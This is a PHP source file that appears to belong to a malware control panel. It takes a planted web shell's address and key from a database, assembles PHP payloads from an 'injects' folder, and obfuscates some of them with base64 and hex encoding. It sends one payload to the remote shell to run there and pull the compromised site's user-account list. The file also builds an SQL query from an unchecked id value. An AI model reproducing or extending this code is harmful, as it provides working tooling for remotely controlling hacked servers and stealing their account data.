<?php

$smarty->assign('rand_name', mt_rand(0000000000, 9999999999));

if(!empty($Cur['id'])){
	$result = $mysqli->query("SELECT id, link, keyid, shell FROM bf_admins WHERE (id='".$Cur['id']."')");
	if($result->id == $Cur['id']){
		$result->get_php = '$cur_file = \''.$result->shell.'\';';
		$result->get_php .= file_get_contents('modules/admins/injects/start.php');
		$result->get_php .= file_get_contents('modules/admins/injects/functions_include.php');
		$result->get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$result->get_php .= file_get_contents('modules/admins/injects/autorize.php');
		$result->get_php = base64_encode(bin2hex($result->get_php));
		
		$result->get_php_a = '$cur_file = \''.$result->shell.'\';';
		$result->get_php_a .= file_get_contents('modules/admins/injects/start.php');
		$result->get_php_a .= file_get_contents('modules/admins/injects/functions_include.php');
		$result->get_php_a .= file_get_contents('modules/admins/injects/mysqli.php');
		$result->get_php_a .= file_get_contents('modules/admins/injects/autorize_h.php');
		$result->get_php_a = base64_encode(bin2hex($result->get_php_a));
		
		$get_php = '$cur_file = \''.$result->shell.'\';';
		$get_php .= file_get_contents('modules/admins/injects/start.php');
		$get_php .= file_get_contents('modules/admins/injects/mysqli.php');
		$get_php .= file_get_contents('modules/admins/injects/cmd_list_users.php');
		
		$users = get_http($result->link, $get_php, $result->keyid, $result->shell);
		$smarty->assign('admin', $result);
		$smarty->assign('users', json_decode($users, false));
		
		$mysqli->save_log($result->link . ' - get accounts list');
	}
}

?>